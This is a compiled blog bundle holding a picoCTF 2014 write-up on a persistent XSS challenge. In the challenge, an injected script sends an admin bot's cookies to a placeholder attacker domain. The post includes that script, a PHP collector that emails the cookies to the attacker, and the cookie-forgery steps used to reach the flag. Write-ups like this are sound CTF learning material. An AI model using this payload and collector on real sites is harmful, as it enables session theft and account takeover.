"use strict";(self.webpackChunkpersonalpage=self.webpackChunkpersonalpage||[]).push([[1216],{5234:e=>{e.exports=JSON.parse('{"permalink":"/blog/picoctf-2014-part2","source":"@site/blog/2014-11-30-picoctf-part2.md","title":"picoCTF 2014 part 2: secure_page_service","description":"Summary","date":"2014-11-30T00:00:00.000Z","tags":[],"readingTime":2.32,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.webp","key":"csressel","page":null}],"frontMatter":{"slug":"picoctf-2014-part2","title":"picoCTF 2014 part 2: secure_page_service","authors":"csressel"},"unlisted":false,"prevItem":{"title":"picoCTF 2014 part 3: Steve\'s List","permalink":"/blog/picoctf-2014-part3"},"nextItem":{"title":"picoCTF 2014 part 1: Injection 2","permalink":"/blog/picoctf-2014-part1"}}')},7157:(e,t,i)=>{i.r(t),i.d(t,{assets:()=>c,contentTitle:()=>n,default:()=>h,frontMatter:()=>a,metadata:()=>o,toc:()=>l});var o=i(5234),s=i(4848),r=i(8453);const a={slug:"picoctf-2014-part2",title:"picoCTF 2014 part 2: secure_page_service",authors:"csressel"},n="secure_page_service",c={authorsImageUrls:[void 0]},l=[{value:"Summary",id:"summary",level:2},{value:"Recon",id:"recon",level:2},{value:"Enter XSS",id:"enter-xss",level:2},{value:"The Setup",id:"the-setup",level:2},{value:"Cookie Forgery",id:"cookie-forgery",level:2}];function p(e){const t={code:"code",h2:"h2",p:"p",pre:"pre",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(t.h2,{id:"summary",children:"Summary"}),"\n",(0,s.jsx)(t.p,{children:"This problem is a simple XSS challenge. Using persistent XSS in a newly created page, we can steal the admin\u2019s cookies should they choose to visit the page. The \u201cReport to Moderator\u201d button says, \u201cReport this page, and a moderator will personally review it in the next few minutes!\u201d so it is a safe assumption that we can have an admin view our injected code."}),"\n",(0,s.jsx)(t.h2,{id:"recon",children:"Recon"}),"\n",(0,s.jsx)(t.p,{children:"The first thing we need is an account on the challenge's site. The home page allows anyone to register. After an account is made, two actions are available: create a page, and view a page. Attempting to view the page asked for in the problem shows it is password protected. A couple quick queries show it is not vulnerable to SQL injection; another route is necessary."}),"\n",(0,s.jsx)(t.p,{children:"Examining the page creation by creating a couple random pages, we notice that we can report pages to be reviewed by a moderator (\u201cSpam? Abuse? Report this page, and a moderator will personally review it in the next few minutes!\u201d)."}),"\n",(0,s.jsx)(t.p,{children:"Furthermore, attempting to use HTML tags reveals that the input allows HTML code."}),"\n",(0,s.jsx)(t.h2,{id:"enter-xss",children:"Enter XSS"}),"\n",(0,s.jsx)(t.p,{children:"We can use a persistent XSS attack to steal the cookies of whoever views the page. By injecting a script into the page, we can send the viewer\u2019s cookies elsewhere. By setting up a php script on a free hosting script, we can redirect the sent cookies to our own email. The final step will be to report the page to moderator to cause them to view our injected page."}),"\n",(0,s.jsx)(t.p,{children:"Once we have the admin\u2019s cookies, we can change our cookies to theirs to view the locked page."}),"\n",(0,s.jsx)(t.h2,{id:"the-setup",children:"The Setup"}),"\n",(0,s.jsx)(t.p,{children:"First we need the two scripts."}),"\n",(0,s.jsx)(t.p,{children:"The injected script for the page will be:"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-html",children:"<script>location.href = 'http://www.YourDomainName.com/cookiestealer.php?cookie='+document.cookie;<\/script>\n"})}),"\n",(0,s.jsx)(t.p,{children:"And the php script at the above domain name (cookiestealer.php) will look like:"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-php",children:'<?php\n$cookie = $HTTP_GET_VARS["cookie"]; mail("YourEmail@YouMailProvider.com", "Stolen Cookies", $cookie);\n?>\n'})}),"\n",(0,s.jsxs)(t.p,{children:["For free hosting, a number of options are available. We chose to use ",(0,s.jsx)("a",{href:"http://www.000webhost.com/",children:"000webhost"}),", simply because they have a nice in-browser file manager\u2014no need to mess around with FTP clients."]}),"\n",(0,s.jsx)(t.h2,{id:"cookie-forgery",children:"Cookie Forgery"}),"\n",(0,s.jsx)(t.p,{children:"After setting up a page with the injected script and the php script on another server, we simply report the page to have a mod (in reality a bot) view the page."}),"\n",(0,s.jsxs)(t.p,{children:["From here, we check our email for the admin cookies. Using a plugin like ",(0,s.jsx)("a",{href:"https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en",children:"this"})," or ",(0,s.jsx)("a",{href:"https://addons.mozilla.org/en-us/firefox/addon/edit-cookies/",children:"this"})," we can quickly change our cookies to the admin's, allowing us to view the locked page, and thus, the flag:"]}),"\n",(0,s.jsx)(t.p,{children:"wow_cross_site_scripting_is_such_web"})]})}function h(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,s.jsx)(t,{...e,children:(0,s.jsx)(p,{...e})}):p(e)}}}]);